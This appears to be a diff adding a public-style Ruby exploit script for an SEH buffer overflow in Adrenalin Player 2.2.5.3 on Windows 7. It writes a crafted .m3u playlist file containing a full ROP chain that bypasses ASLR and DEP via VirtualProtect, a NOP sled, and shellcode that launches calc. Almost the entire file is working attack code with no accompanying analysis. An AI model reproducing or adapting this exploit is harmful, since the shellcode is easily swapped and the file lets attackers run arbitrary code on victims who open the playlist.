@@ -1,0 +1,127 @@
+#!/usr/bin env ruby
+# Exploit Title: Adrenalin Player 2.2.5.3 (.m3u) SEH-Buffer Overflow ASLR+DEP Bypass
+# Date: 3/2/2014
+# Exploit Author: Muhamad Fadzil Ramli
+# Vendor HomePage: http://software.naver.com/software/summary.nhn?softwareId=MFS_100099
+# Software Link: http://software.naver.com/software/summary.nhn?softwareId=MFS_100099
+# Version App: 2.2.5.3
+# Tested on: Windows 7 x86 - Version 6.1.7600
+# CVE:None
+# Notes:-
+# Offset to kernel32 - 0xF8C
+# Offset to virtualProtect - 0xC039
+
+filename = "motiv.m3u"
+
+rop =  ''
+rop << [0x10129df6].pack('V')		# PUSH ESP # POP ESI # RETN 0x10
+rop << [0x10135eaf].pack('V') * 5	# RETN
+rop << [0x1010c4c2].pack('V')		# ADD ESP,20 # RETN
+
+rop << 'VVVV'						# VirtualProtect()
+rop << 'WWWW'                 		# return address
+rop << 'XXXX'                 		# lpAddress
+rop << 'YYYY'                 		# dwSize
+rop << 'ZZZZ'                 		# flNewProtect
+rop << [0x1024bb98].pack('V')		# lpOldProtect - writeable address
+rop << [0x10135eaf].pack('V') * 2	# RETN (ROP NOP)
+
+# kernel32 address
+rop << [0x1003de9f].pack('V')		# PUSH ESI # POP EAX # MOV EAX,ESI # POP EDI # RETN
+rop << "AAAA"						# FILLER
+rop << [0x1005de8e].pack('V')		# XCHG EAX,EBP # RETN
+rop << [0x1012014d].pack('V')		# XOR EAX,EAX # RETN
+rop << [0x101201d6].pack('V')		# POP EAX # RETN
+rop << [0xFFFFF074].pack('V')		# OFFSET F8C
+rop << [0x101111e2].pack('V')		# NEG EAX # RETN
+rop << [0x1013a5e4].pack('V')		# ADD EAX,EBP # RETN
+rop << [0x1010010f].pack('V')		# POP ECX # RETN
+rop << [0xFFFFFFFF].pack('V')		#
+rop << [0x1012dd87].pack('V')		# MOV EAX,DWORD PTR DS:[EAX] # ADD EAX,ECX # RETN
+rop << [0x1012014b].pack('V')		# INC EAX # RETN
+# virtualProtect Address
+rop << [0x1002660b].pack('V')		# XCHG EAX,ECX # MOV EDX,5E5F0002 # POP EBP # POP EBX # RETN 0x0C
+rop << "XXXX" * 2					# FILLER
+rop << [0x1012014d].pack('V')		# XOR EAX,EAX # RETN
+rop << "AAAA" * 3					# FILLER
+rop << [0x101201d6].pack('V')		# POP EAX # RETN
+rop << [0xFFFF3FC7].pack('V')		# OFSET C039
+rop << [0x101111e2].pack('V')		# NEG EAX # RETN
+rop << [0x1002660b].pack('V')		# XCHG EAX,ECX # MOV EDX,5E5F0002 # POP EBP # POP EBX # RETN 0x0C
+rop << "AAAA" * 2					# FILLER
+rop << [0x1013c584].pack('V')		# SUB EAX,ECX # RETN
+rop << [0x1010010f].pack('V')		# POP ECX # RETN
+rop << [0xFFFFFFFF].pack('V')		#
+rop << [0x1012dd87].pack('V')		# MOV EAX,DWORD PTR DS:[EAX] # ADD EAX,ECX # RETN
+
+# assign virtualprotect address
+rop << [0x1006798b].pack('V') * 8	# INC ESI # RETN
+rop << [0x1010eac7].pack('V')		# MOV DWORD PTR DS:[ESI+10],EAX # MOV EAX,ESI # POP ESI # RETN
+rop << "AAAA"						# FILLER
+
+# return address
+rop << [0x10117105].pack('V')		# PUSH EAX # POP ESI # POP EBX # RETN
+rop << [0x10135eaf].pack('V')		# FILLER
+rop << [0x1014b57f].pack('V')		# ADD EAX,100 # POP EBP # RETN
+rop << [0x10135eaf].pack('V')		# FILLER
+rop << [0x1014b57f].pack('V')		# ADD EAX,100 # POP EBP # RETN
+rop << [0x10135eaf].pack('V')		# FILLER
+rop << [0x1006798b].pack('V') * 4	# INC ESI # RETN
+rop << [0x1010eac7].pack('V')		# MOV DWORD PTR DS:[ESI+10],EAX # MOV EAX,ESI # POP ESI # RETN
+rop << "AAAA"
+
+# lpAddress
+rop << [0x10117105].pack('V')		# PUSH EAX # POP ESI # POP EBX # RETN
+rop << [0x10135eaf].pack('V')		# FILLER
+rop << [0x1014b57f].pack('V')		# ADD EAX,100 # POP EBP # RETN
+rop << [0x10135eaf].pack('V')		# RETN FILLER
+rop << [0x1014b57f].pack('V')		# ADD EAX,100 # POP EBP # RETN
+rop << [0x10135eaf].pack('V')		# FILLER
+rop << [0x1006798b].pack('V') * 4	# INC ESI # RETN
+rop << [0x1010eac7].pack('V')		# MOV DWORD PTR DS:[ESI+10],EAX # MOV EAX,ESI # POP ESI # RETN
+rop << "AAAA"						# FILLER
+
+# dwSize
+rop << [0x10117105].pack('V')		# PUSH EAX # POP ESI # POP EBX # RETN
+rop << [0x10135eaf].pack('V')		# FILLER
+rop << [0x1012014d].pack('V')		# XOR EAX,EAX # RETN
+rop << [0x101201d6].pack('V')		# POP EAX # RETN
+rop << [0xfffffcff].pack('V')		# 300
+rop << [0x101111e2].pack('V')		# NEG EAX # RETN
+rop << [0x1006798b].pack('V') * 4	# INC ESI # RETN
+rop << [0x1010eac7].pack('V')		# MOV DWORD PTR DS:[ESI+10],EAX # MOV EAX,ESI # POP ESI # RETN
+rop << "AAAA"
+
+# flNewProtect
+rop << [0x10117105].pack('V')		# PUSH EAX # POP ESI # POP EBX # RETN
+rop << [0x10135eaf].pack('V')		# RETN FILLER
+rop << [0x1012014d].pack('V')		# XOR EAX,EAX # RETN
+rop << [0x101201d6].pack('V')		# POP EAX # RETN
+rop << [0xffffffc0].pack('V')		# 40
+rop << [0x101111e2].pack('V')		# NEG EAX # RETN
+rop << [0x1006798b].pack('V') * 4	# INC ESI # RETN
+rop << [0x1010eac7].pack('V')		# MOV DWORD PTR DS:[ESI+10],EAX # MOV EAX,ESI # POP ESI # RETN
+rop << "AAAA"
+
+# Execute VirtualProtect
+rop << [0x101263a0].pack('V')		# XCHG EAX,ESP # RETN
+
+sc = 
+"\x66\x81\xE4\xFC\xFF\x31\xD2\x52\x68\x63\x61\x6C\x63\x89\xE6\x52" +
+"\x56\x64\x8B\x72\x30\x8B\x76\x0C\x8B\x76\x0C\xAD\x8B\x30\x8B\x7E" +
+"\x18\x8B\x5F\x3C\x8B\x5C\x1F\x78\x8B\x74\x1F\x20\x01\xFE\x8B\x4C" +
+"\x1F\x24\x01\xF9\x42\xAD\x81\x3C\x07\x57\x69\x6E\x45\x75\xF5\x0F" +
+"\xB7\x54\x51\xFE\x8B\x74\x1F\x1C\x01\xFE\x03\x3C\x96\xFF\xD7\xCC"
+
+xploit = rop
+xploit << "\x90" * 256
+xploit << sc
+
+data = "A" * 2176
+data[24,xploit.length] = xploit
+data[2172+4,4] = [0x100d7aec].pack("V") # SEH - STACK PIVOT
+
+File.open(filename,'w') do |fd|
+    fd.write data
+    puts "exploit file size : #{data.length.to_s}"
+end
